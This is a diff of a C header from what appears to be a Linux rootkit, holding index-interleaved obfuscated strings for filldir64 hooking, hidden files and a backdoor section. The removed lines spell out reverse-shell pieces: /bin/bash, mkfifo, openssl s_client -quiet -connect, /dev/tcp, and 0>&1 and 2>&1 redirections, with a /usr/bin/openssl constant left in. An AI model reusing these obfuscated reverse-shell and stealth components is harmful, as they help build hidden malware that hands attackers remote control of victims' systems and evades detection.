@@ -52,20 +52,6 @@
 /** filldir64 */
 #define _OBF_FILLDIR64  "\000f\001i\002l\003l\004d\005i\006r\0076\0104"
 
-/** tty_read */
-#define _OBF_TTY_READ  "\000t\001t\002y\003_\004r\005e\006a\007d"
-
-/**
- * Misc strings
- */
-
-//** md5sum */
-#define _OBF_MD5SUM  "\000m\001d\0025\003s\004u\005m"
-
-/**
- * User commands
- */
-
 /**
  * Hidden files & directories
  */
@@ -108,55 +94,6 @@
 /**
  * backdoors
  */
-/** OPENSSL */
-#define _OBF_OPENSSL  "\000O\001P\002E\003N\004S\005S\006L"
-
-/** verify=0 */
-#define _OBF_VERIFY_0  "\000v\001e\002r\003i\004f\005y\006=\0070"
-
-/** EXEC */
-#define _OBF_EXEC  "\000E\001X\002E\003C"
-
-/** tail -F -n +1 /var/ */
-#define _OBF_TAIL   "\000t\001a\002i\003l\004 \005-\006F\007 \010-\011n\012 " \
-                    "\013+\0141"
-
-/** /bin/bash */
-#define _OBF__BIN_BASH  "\000/\001b\002i\003n\004/\005b\006a\007s\010h"
-
-/** /bin/sh */
-#define _OBF_BIN_SH  "\000/\001b\002i\003n\004/\005s\006h"
-
-/** /tmp */
-#define _OBF_TMP  "\000/\001t\002m\003p"
-
-/** /usr/bin/mkfifo */
-#define _OBF_USR_BIN_MKFIFO  "\000/\001u\002s\003r\004/\005b\006i\007n\010/\011m\012k\013f\014i\015f\016o"
-
-/** s_client -quiet -connect */
-#define _OBF_SCLIENT__QUIET__CONNECT  "\000s\001_\002c\003l\004i\005e\006n\007t\010 \011-\012q\013u\014i\015e\016t\017 \020-\021c\022o\023n\024n\025e\026c\027t"
-
-/** 2>&1 */
-#define _OBF_STD_TWO  "\0002\001>\002&\0031"
-
-/** /dev/tcp */
-#define _OBF_DEV_TCP  "\000/\001d\002e\003v\004/\005t\006c\007p"
-
-/** 0>&1 */
-#define _OBF_STD_ZERO  "\0000\001>\002&\0031"
-
-/** -i >& */
-#define _OBF__INTERACTIVE  "\000-\001i\002 \003>\004&"
-
-/** -c */
-#define _OBF__C  "\000-\001c"
-
-/** HOME=/ */
-#define _OBF_HOME  "\000H\001O\002M\003E\004=\005/"
-
-/** TERM=linux */
-#define _OBF_TERM_LINUX  "\000T\001E\002R\003M\004=\005l\006i\007n\010u\011x"
-
 /* /usr/bin/openssl */
 #define _OBF_USR_BIN_OPENSSL  "\000/\001u\002s\003r\004/\005b\006i\007n\010/\011o\012p\013e\014n\015s\016s\017l"
 
